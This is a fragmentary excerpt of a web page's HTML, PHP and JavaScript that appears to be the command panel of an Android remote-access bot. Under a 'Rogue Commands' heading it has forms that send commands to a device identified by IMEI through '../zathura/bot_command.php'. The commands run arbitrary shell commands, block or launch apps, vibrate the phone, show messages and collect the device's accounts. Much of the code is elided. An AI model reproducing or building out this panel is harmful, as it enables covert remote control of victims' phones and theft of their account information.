  ...
  to {bottom: 0; opacity: 0;}
	...
	<main class="full-box main-container">
		...
		<section class="full-box page-content">
			...
			<i class="fas fa-biohazard"></i> &nbsp; Rogue Commands
							...
							<div class="row">
								<div class="col-12 col-md-6">
									...
									<div class="form-group">
										...
										<label   class="bmd-label-floating"> <b> <i class="fas fa-bread-slice">&nbsp Enter a message to toast. </b></label></i>
                   ...
                   ?>
								 ...
								 var set = "set";
						      	...
						      	<div onclick="myFunction(imei,toast)" class="button_cont" align="center"><a class="example_c"  target="_blank" rel="nofollow noopener">Execute</a></div>
									...
									<div class="form-group">
										<label   class="bmd-label-floating"> <b> <i class="fab fa-github-alt"></i>&nbsp Enter package name of an app to launch. </b></label></i>
						      	...
						      	<div onclick="myFunction(imei,launch)" class="button_cont" align="center"><a class="example_c"  target="_blank" rel="nofollow noopener">Execute</a></div>
									...
									<div class="form-group">
										<label   class="bmd-label-floating"> <b><i class="fab fa-grunt"></i>&nbsp Enter package name to block access.To block multiple use commas. </b></label></i>
                                ...
                                <br>
										...
										<label   class="bmd-label-floating"> <b> <i class="fab fa-optin-monster"></i>&nbsp Enter time in milliseconds to vibrate. </b></label></i>
                   ...
                   ?>
				 			...
				 			<label   class="bmd-label-floating"> <b>&nbsp Terminal </b></label></i>
							   ...
							   <div class="form-group">
										...
										<label   class="bmd-label-floating"> <b> <i class="fas fa-terminal"></i>&nbsp Enter a shell command to execute. </b></label></i>
		...
		<?php
                   ...
                   ?>
							...
							<li><a href="#" onclick="command(imei,gac)"><i class="far fa-user-circle"></i> &nbsp; Get Device Accounts</a></li>
                             ...
                             <script type="text/javascript">
                              ...
                              x.className = "show";
                                setTimeout(function(){ x.className = x.className.replace("show", ""); }, 4000);
								  ...
								  $.post('../zathura/bot_command.php', { imei: imei,command: y , function(data) { 
                                   console.log(data); 
